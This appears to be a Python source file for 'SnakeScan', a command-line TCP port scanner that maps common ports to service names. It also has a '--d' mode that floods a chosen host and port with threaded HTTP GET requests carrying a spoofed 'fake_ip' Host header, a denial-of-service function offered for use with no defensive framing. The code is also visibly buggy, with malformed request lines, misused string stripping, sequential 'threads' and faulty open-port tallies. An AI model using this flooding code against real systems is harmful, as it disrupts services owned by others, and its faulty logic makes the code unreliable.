"""Module SnakeScan"""
__version__="1.2.7"
import socket
from art import tprint
from datetime import datetime
from tqdm import tqdm
from termcolor import colored
from threading import Thread
portsopen=0
portsclosed=0
Run_now=True
Bool=True
boolsd=False
global num
num=0
boolean=0
OpenPorts=[]
ports = {
    20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "Telnet",
    25: "SMTP", 43: "WHOIS", 53: "DNS", 80: "http",
    115: "SFTP", 123: "NTP", 143: "IMAP", 161: "SNMP",
    179: "BGP", 443: "HTTPS", 445: "MICROSOFT-DS",
    514: "SYSLOG", 515: "PRINTER", 993: "IMAPS",
    995: "POP3S", 1080: "SOCKS", 1194: "OpenVPN",
    1433: "SQL Server", 1723: "PPTP", 3128: "HTTP",
    3268: "LDAP", 3306: "MySQL", 3389: "RDP",
    5432: "PostgreSQL", 5900: "VNC", 8080: "Tomcat", 10000: "Webmin" }
def is_port_open(host,port):
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		#Connecting...
		s.connect((host,port))
		#Port//(Closed<--or-->Open)
	except:
		s.close()
		return False
	else:
		s.close()
		return True
def is_port_open_threads(host,port):
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		#Connecting...
		s.connect((host,port))
		#Port//(Closed<--or-->Open)
	except:
		s.close()
		try:
		    print(f"Closed{colored('|X|','red')}-->{ports[all]}|{all}|")
		except:
		    print(f"Closed{colored('|X|','red')}-->|{all}|")
		finally:
		    s.close()
	else:
		print(f"Open{colored('|√|','green')}-->{ports[all]}|{all}|")
def dos_threads(host,port,fake_ip):
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	#Connect
	try:
		s.connect((host,port))
		s.sendto(("GET /"+host+"HTTP/1.1\r\n").encode("ascii"),(host,port))
		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"),(host,port))
		s.close()
		return False
	except:
		s.close()
		return True
print("–"*60)
tprint("SnakeScan")
print("–"*60)
print(f"Release:{__version__}".rjust(60))
print(f"Skip{colored('|*|','blue')}Error: {colored('Host','green')}{colored('[X]:Error','red')} {colored('|$|','green')} {colored('Port','green')}{colored('[X]:Error','red')}")
while Run_now:
	host=input(f"{colored('[$]','green')}Host-->")
	if "--d" in host:
	    boolsd=True
	if "http://" in host:
	    host=host.strip("http://").strip("--d")
	    for i in range(len(host)-1):
	        if host[i] == "/":
	           host=host[0:i]
	elif "https://" in host:
	    host=host.strip("https://").strip("--d")
	    for i in range(len(host)-1):
	        if host[i] == "/":
	           host=host[0:i]
	try:
	    host=socket.gethostbyname(host)
	except:
	    print("Host is not avaible")
	    continue
	finally:
	    if boolsd:
	        host=host+""+"--d"
	if "--d" in host:
			           host=host.strip("--d").strip()
			           try:
			               threadsnum=int(input(f"{colored('[$]','green')}Threads-->"))
			               dos_port=int(input(f"{colored('[$]','green')}Port-->"))
			               fake_ip=input(f"{colored('[$]','green')}Fake_ip-->")
			           except:
			                       while True:
			                           print(f"{colored('|Threads|Port|','green')}{colored('[X]:Invalid value','red')}")
			                   			                    
			                           try:
			                               threadsnum=int(input(f"{colored('[$]','green')}Threads-->"))
			                               dos_port=int(input(f"{colored('[$]','green')}Port-->"))
			                               fake_ip=input(f"{colored('[$]','green')}Fake_ip-->")
			                            
			                           except:
			                               continue
			                           if threadsnum:
			                               break			     
			           for dos in range(0,threadsnum):
			               num+=1
			               t=Thread(target=dos_threads,kwargs={"host":host,"port":dos_port,"fake_ip":fake_ip})
			               t.start()
			               t.join()
			           if dos_threads(host,dos_port,fake_ip):
			               print("Host or Port not avaible")
			           else:
			               print("Dos-Information".center(60,"-"))
			               print(f"{colored('[$]','green')}Threads--> {num} GET/{host}:{dos_port} HTTP/1.1")
			           continue	               			               
	if host == "Exit"  or host == "exit":
		break
	if host == "":
	    while True:
	        print(f"{colored('Host','green')}{colored('[X]:Empty value','red')}")
	        host=input(f"{colored('[$]','green')}Host-->")
	        if host:
	            break
	if host == "localhost":
	    host=socket.gethostbyname(socket.gethostname())		
	port_user=input(f"{colored('[$]','green')}Port-->")
	if port_user == "":
	    while True:
	        print(f"{colored('Port','green')}{colored('[X]:Empty value','red')}")
	        port_user=input(f"{colored('[$]','green')}Port-->")
	        if port_user:
	            break
	port_single=port_user
	if port_user == "Exit" or port_user == "Exit":
		break
	if port_user:
		try:
			length=int(port_user)
		except:
			   if "--t" in str(port_user):
			           print(f"Thread".center(60,"-"))
			           for all in ports.keys():
			               t=Thread(target=is_port_open_threads,kwargs={"host":host,"port":all})
			               t.start()
			               t.join()
			   if "--a" in str(port_user):
			           print(f"Check All Ports".center(60,"-"))
			           for all in ports.keys():
			               if is_port_open(host,all):
			                   print(f"Open{colored('|√|','green')}-->{ports[all]}|{all}|")
			               else:
			                       try:
			                           print(f"Closed{colored('|X|','red')}-->{ports[all]}|{all}|")
			                       except:
			                           print(f"Closed{colored('|X|','red')}-->|{all}|")
			           continue
			   if "--s" in str(port_user):
			       port_user=port_single.strip().strip("--s")[1:len(port_user)]
			       for i in range(len(port_user)):
			           if port_user[i] == " ":
			               port_user=port_user[0:i]
			               break
			       try:
			           port_user=int(port_user)
			       except:
			           port_user="None"
			       for singel in range(1):
			           if is_port_open(host,port_user):
			               print(f"Open{colored('|√|','green')}-->{ports[port_user]}|{port_user}|")
			           else:
			               try:
			                   print(f"Closed{colored('|X|','red')}-->{ports[port_user]}|{port_user}|")
			               except:
			                    print(f"Closed{colored('|X|','red')}-->|{port_user}|")
			  			               
			       continue
			       
			   else:
			      if "--t" in port_user:
			          t.join()
			          continue
			      port_user="100"
			      print(f"{colored('[!]','red')}Port:invalid value")
			      for i in range(0,len(port_user)):
			          if port_user[i] == " ":
			              port_user=100
			              break
			      port_user=int(port_user)
			      length=port_user
	else:
		print(f"{colored('|*|','blue')}100")
		port_user=100
		length=port_user
	print(f"{colored('|!|','red')}Listening {host} please wait...")
#|-----------------Starting---------------------|
	length=int(length)+1
	for port in tqdm(range(1,length)):
						if is_port_open(host,port):
							for name in ports:
									if port == name:
										OpenPorts=[port]
										portsopen+=1
						else:
							portsclosed+=1
						if port_user  != "":
										if int(port_user) == port:
											if port_user == "":
												pass
											elif int(port_user) == port:
												if is_port_open(host,port):
													Bool=True
													boolean+=1
										else:
											Bool=False												
	if boolean == 1:
		pass
	for i in OpenPorts:
		print(f"Open{colored('|√|','green')}-->{ports[i]}|{i}|")
	print(f"{host}".center(60,"-"))
	print(f"Closed{colored('|X|','red')}:{portsclosed}")
	portsclosed=0
	print(f"Open{colored('|√|','green')}:{portsopen}")
	portsopen=0
	print("-"*60) 